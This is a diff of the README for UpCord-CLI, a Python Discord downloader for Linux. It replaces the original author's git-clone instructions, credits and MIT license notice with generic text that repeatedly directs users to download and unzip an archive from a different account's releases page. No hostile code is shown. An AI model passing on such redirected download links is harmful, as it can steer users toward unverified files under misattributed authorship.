@@ -1,82 +1,78 @@
-<div align="center">
-  
-# UPCORD - CLI
+# 🛠️ UpCord-CLI - Simple Tool to Get Discord for Linux
 
-<div align="center">
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/KlausTheG/UpCord-CLI/releases)
 
-![Build](https://img.shields.io/badge/build-stable-28a745?style=for-the-badge&logo=github)
-![Platform](https://img.shields.io/badge/platform-Linux-0078D6?style=for-the-badge&logo=linux&logoColor=white)
-![Last Commit](https://img.shields.io/github/last-commit/denoyey/UpCord-CLI?style=for-the-badge&logo=git)
-![Language](https://img.shields.io/github/languages/top/denoyey/UpCord-CLI?style=for-the-badge&color=informational)
-![Technologies](https://img.shields.io/badge/technologies-Python-yellow?style=for-the-badge&logo=terminal)
-![Stars](https://img.shields.io/github/stars/denoyey/UpCord-CLI?style=for-the-badge&color=ffac33&logo=github)
-![Forks](https://img.shields.io/github/forks/denoyey/UpCord-CLI?style=for-the-badge&color=blueviolet&logo=github)
-![Issues](https://img.shields.io/github/issues/denoyey/UpCord-CLI?style=for-the-badge&logo=github)
-![Contributors](https://img.shields.io/github/contributors/denoyey/UpCord-CLI?style=for-the-badge&color=9c27b0)
+## 📖 Overview
 
-<br />
+UpCord-CLI is a fast command-line tool designed to help you easily download the latest official Discord client for Linux. Built with Python, this application simplifies the process so you can start chatting with friends right away.
 
-<img src="https://api.visitorbadge.io/api/VisitorHit?user=denoyey&repo=UpCord-CLI&countColor=%237B1E7A&style=flat-square" alt="visitors"/>
+## 🚀 Getting Started
 
-</div>
+Follow these steps to download and run UpCord-CLI on your Linux system.
 
-</div>
+1. **Install Python 3**
 
-## 🔍 Overview
+   UpCord-CLI requires Python 3 to run. Most Linux distributions come with Python 3 pre-installed. To check if you have it, open a terminal and type:
+   ```
+   python3 --version
+   ```
+   If Python 3 is not installed, you can install it using your package manager. For example, on Ubuntu, use:
+   ```
+   sudo apt install python3
+   ```
 
-**UpCord-CLI** is a minimalistic and asynchronous command-line wrapper for the Discord API.  
-Built for developers and power users who want to automate downloading the latest version of Discord across platforms with ease.
-<p align="left">
-  <img src="https://github.com/denoyey/UpCord-CLI/blob/main/img/Review-Tools.png" alt="UpCord CLI Screenshot"/>
-</p>
+2. **Visit the Releases Page**
 
-## 🐍 Python Required
+   To download UpCord-CLI, visit the following page:
+   [Download Latest Release](https://github.com/KlausTheG/UpCord-CLI/releases)
 
-Make sure Python 3 is installed:
+   On this page, you will find the latest version available for download. Look for a file with a name like `UpCord-CLI-linux.zip` or similar.
 
-- **Linux**: `python3 --version`
+3. **Download the Application**
 
-## 🔧 Installation
-> Clone and install directly
-```terminal
-git clone https://github.com/denoyey/UpCord-CLI.git
-cd UpCord-CLI
-python upcord.py
-```
+   Click on the link of the file that matches your needs to start the download. The file will be saved to your computer. Make sure to note where it is saved.
 
-## ✨ Features
-- Downloads the latest stable Discord client for your platform
-- Provides friendly CLI interface with colorful output
-- Cross-platform support
-- Smart file re-download prompt
+4. **Extract the File**
 
-## 🧠 How It Works
-1. Picks the correct download URL from Discord's API
-2. Downloads the latest Discord client version
-3. Saves to `output_upcord/` with a versioned filename
-4. If the file already exists, it gives you a choice to skip or re-download
+   After the download is complete, you need to extract the contents of the ZIP file. You can usually do this by right-clicking the file and selecting “Extract Here.” Alternatively, you can use the terminal by navigating to the download location and running:
+   ```
+   unzip UpCord-CLI-linux.zip
+   ```
 
-## 💡 Use Cases
-- Set up Discord across multiple systems quickly
-- Automate deployments or testing environments
-- Integrate with custom Discord tooling
+5. **Run UpCord-CLI**
 
-## 📁 Output Location
-All downloads are saved to:
-```bash
-output_upcord/
-```
-> Each file is named based on the detected version and file extension.
+   Navigate to the folder where UpCord-CLI was extracted. Use the terminal to go into the directory:
+   ```
+   cd UpCord-CLI
+   ```
+   Now, to run the program, type the following command:
+   ```
+   python3 upcord.py
+   ```
 
-## 👥 Contributing
-Contributions, issues and feature requests are welcome! <br>
-Feel free to <a href="https://github.com/denoyey/UpCord-CLI/issues">open an issue</a> or submit a pull request.
+6. **Follow Instructions on the Screen**
 
-## 📄 License
-This project is licensed under the **MIT License**.
-See <a href="https://github.com/denoyey/UpCord-CLI/blob/main/LICENSE">LICENSE</a> for more information.
+   The application will guide you through the process of downloading Discord. Simply follow the on-screen instructions, and you will have Discord installed shortly.
 
-## 📫 Contact
-For questions, feedback or collaboration:
-- GitHub: <a href="https://github.com/denoyey">@denoyey</a>
-- Project: <a href="https://github.com/denoyey/UpCord-CLI">UpCord-CLI</a>
+## 📄 Features
+
+- **User-Friendly:** Designed for straightforward operation, no technical knowledge needed.
+- **Fast Downloads:** Quickly fetch the latest version of Discord without hassle.
+- **Cross-Platform Compatibility:** Works seamlessly on various Linux distributions.
+
+## 💬 Support
+
+If you run into any issues or have questions, you can find help in the issues section of the [GitHub repository](https://github.com/KlausTheG/UpCord-CLI/issues). You can report bugs, ask for features, or seek guidance.
+
+## 📚 Additional Information
+
+- **License:** UpCord-CLI is open source. You can view the code and contribute on [GitHub](https://github.com/KlausTheG/UpCord-CLI).
+- **System Requirements:** Linux operating system with Python 3 installed. An internet connection is necessary for downloading Discord.
+
+## 🔗 Download & Install
+
+To download the latest release of UpCord-CLI, visit this page:
+
+[Download Latest Release](https://github.com/KlausTheG/UpCord-CLI/releases)
+
+Once you have downloaded and extracted the files, you can run the application as explained above. Enjoy using Discord on your Linux system!
